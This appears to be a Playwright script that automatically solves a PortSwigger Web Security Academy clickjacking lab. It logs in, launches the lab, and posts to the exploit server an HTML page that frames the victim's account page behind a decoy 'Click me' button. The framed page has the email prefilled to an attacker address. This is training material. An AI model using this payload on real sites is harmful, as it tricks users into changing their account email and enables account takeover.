const { chromium } = require('playwright');

const EMAIL = process.env.PORTSWIGGER_EMAIL;
const PASSWORD = process.env.PORTSWIGGER_PASSWORD;

async function solveClickjacking() {
  const browser = await chromium.launch({ headless: true, args: ['--no-sandbox'] });
  const ctx = await browser.newContext({ viewport: { width: 1280, height: 900 } });
  const page = await ctx.newPage();
  
  try {
    // Login
    await page.goto('https://portswigger.net/users', { waitUntil: 'networkidle', timeout: 30000 });
    await page.fill('#EmailAddress', EMAIL);
    await page.fill('#Password', PASSWORD);
    await Promise.all([
      page.waitForNavigation({ timeout: 15000 }).catch(() => {}),
      page.click('#Login'),
    ]);
    await page.waitForTimeout(2000);
    
    // Find lab
    await page.goto('https://portswigger.net/web-security/all-labs', { waitUntil: 'networkidle', timeout: 30000 });
    await page.waitForTimeout(3000);
    
    const labLink = await page.evaluate(() => {
      const links = [...document.querySelectorAll('.widgetcontainer-lab-link')];
      const topicLinks = links.filter(el => {
        const a = el.querySelector('a');
        return a?.getAttribute('href')?.includes('/web-security/clickjacking/');
      });
      const target = topicLinks[1]; // lab 2
      if (target?.className.includes('is-solved')) return 'SOLVED';
      return target?.querySelector('a')?.getAttribute('href') || null;
    });
    
    if (labLink === 'SOLVED') {
      console.log('Already solved');
      await browser.close();
      return true;
    }
    
    // Launch lab
    await page.goto('https://portswigger.net' + labLink, { waitUntil: 'networkidle', timeout: 30000 });
    const launchLink = await page.$('a[href*="labs/launch"]');
    await page.goto('https://portswigger.net' + (await launchLink.getAttribute('href')), {
      waitUntil: 'domcontentloaded', timeout: 60000,
    });
    await page.waitForTimeout(45000);
    
    const base = new URL(page.url()).origin;
    console.log('Lab URL:', base);
    
    // Find exploit server
    await page.goto(base, { waitUntil: 'networkidle', timeout: 15000 });
    const exploitLink = await page.$('a[href*="exploit-server"]');
    if (!exploitLink) {
      console.log('No exploit server link found');
      await browser.close();
      return false;
    }
    
    const exploitUrl = await exploitLink.getAttribute('href');
    console.log('Exploit server:', exploitUrl);
    
    // Go to exploit server
    await page.goto(exploitUrl, { waitUntil: 'networkidle', timeout: 15000 });
    
    // Create clickjacking payload
    const payload = `<html>
<head>
<style>
    iframe {
        position:relative;
        width: 500px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top: 500px;
        left: 60px;
        z-index: 1;
    }
</style>
</head>
<body>
<div>Click me</div>
<iframe src="${base}/my-account?email=attacker@attacker.com"></iframe>
</body>
</html>`;
    
    // Fill in the exploit server form
    // Fill in the exploit server form
    await page.fill('textarea[name="responseBody"]', payload);
    await page.fill('input[name="responseFile"]', '/exploit');
    await page.click('button[type="submit"]');
    await page.waitForTimeout(2000);
    await page.fill('input[name="url"]', '/exploit');
    await page.click('button[type="submit"]');
    await page.waitForTimeout(2000);
    
    // Deliver to victim
    const deliverBtn = await page.$('a[href*="deliver-to-victim"]');
    if (deliverBtn) {
      await deliverBtn.click();
      await page.waitForTimeout(3000);
    }
    
    // Verify
    await page.goto(base, { waitUntil: 'domcontentloaded', timeout: 15000 });
    const body = await page.textContent('body').catch(() => '');
    const solved = body?.toLowerCase().includes('congratulations');
    console.log('Solved:', solved);
    
    await browser.close();
    return solved;
  } catch (e) {
    console.error('Error:', e.message);
    await browser.close();
    return false;
  }
}

solveClickjacking().then(solved => {
  console.log(solved ? '🎯 SOLVED!' : '⬜ Not solved');
  process.exit(solved ? 0 : 1);
}).catch(e => {
  console.error(e);
  process.exit(1);
});
